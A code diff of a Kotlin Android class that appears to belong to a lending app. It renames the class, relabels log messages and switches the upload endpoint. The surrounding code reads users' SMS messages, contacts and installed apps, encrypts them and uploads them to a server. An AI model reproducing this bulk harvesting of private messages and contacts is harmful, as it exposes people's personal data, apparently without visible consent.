@@ -35,19 +35,19 @@ import java.text.SimpleDateFormat
 import java.util.*
 import java.util.regex.Pattern
 
-class CollectDataMgr {
+class CollectDataMgr2 {
 
     private val TAG = "CollectDataMgr"
 
     companion object {
         val sInstance by lazy(LazyThreadSafetyMode.NONE) {
-            CollectDataMgr()
+            CollectDataMgr2()
         }
     }
 
     fun collectAuthData(context: Context, orderId: String, observer: Observer?) {
         var startMillions = System.currentTimeMillis()
-        LogSaver.logToFile("new start collect data start")
+        LogSaver.logToFile("old start collect data start")
         ThreadUtils.executeByCached(object : SimpleTask<Exception?>() {
             @Throws(Throwable::class)
             override fun doInBackground(): Exception? {
@@ -58,7 +58,7 @@ class CollectDataMgr {
                     val smsStr = if (TextUtils.isEmpty(tempSms)) "" else tempSms
 
                     val duration1 = (System.currentTimeMillis() - startMillions)
-                    logFile(" new read sms duration = " + duration1)
+                    logFile(" old read sms duration = " + duration1)
 
                     val callRecordStr = ""
 //                        EncodeUtils.encryptAES(GsonUtils.toJson(readCallRecord(context)))
@@ -66,7 +66,7 @@ class CollectDataMgr {
                     val originContract = GsonUtils.toJson(readContract(context))
                     val tempContract = EncodeUtils.encryptAES(originContract)
                     val duration2 = (System.currentTimeMillis() - startMillions)
-                    logFile("new read contact duration = " + duration2)
+                    logFile("old read contact duration = " + duration2)
                     val contractStr = if (TextUtils.isEmpty(tempContract)) "" else tempContract
 
                     startMillions = System.currentTimeMillis()
@@ -74,7 +74,7 @@ class CollectDataMgr {
                     val tempAppInfo = EncodeUtils.encryptAES(originAppInfo)
                     val appInfoStr = if (TextUtils.isEmpty(tempAppInfo)) "" else tempAppInfo
                     val duration3 = (System.currentTimeMillis() - startMillions)
-                    logFile(" new read app info duration = " + duration3)
+                    logFile(" old read app info duration = " + duration3)
                     val locationBean = ""
 //                        EncodeUtils.encryptAES(GsonUtils.toJson(LocationMgr.getInstance().locationBean))
 
@@ -311,13 +311,13 @@ class CollectDataMgr {
         jsonObject: JSONObject, observer: Observer?,
         originSms: String?, originContract: String?, originAppInfo: String?
     ) {
-        logFile("new start upload auth .")
+        logFile("old start upload auth .")
         var startMillions = System.currentTimeMillis()
-        OkGo.post<String>(Api.UPLOAD_AUTH).tag(TAG).upJson(jsonObject)
+        OkGo.post<String>(Api.UPLOAD_AUTH2).tag(TAG).upJson(jsonObject)
             .execute(object : StringCallback() {
                 override fun onSuccess(response: Response<String>) {
 //                        Log.i(TAG, " response success= " + response.body());
-                    logFile("new start upload auth success =  " + (System.currentTimeMillis() - startMillions))
+                    logFile("old start upload auth success =  " + (System.currentTimeMillis() - startMillions))
                     var authBean: AuthResponseBean? = CheckResponseUtils.checkResponseSuccess(
                         response,
                         AuthResponseBean::class.java
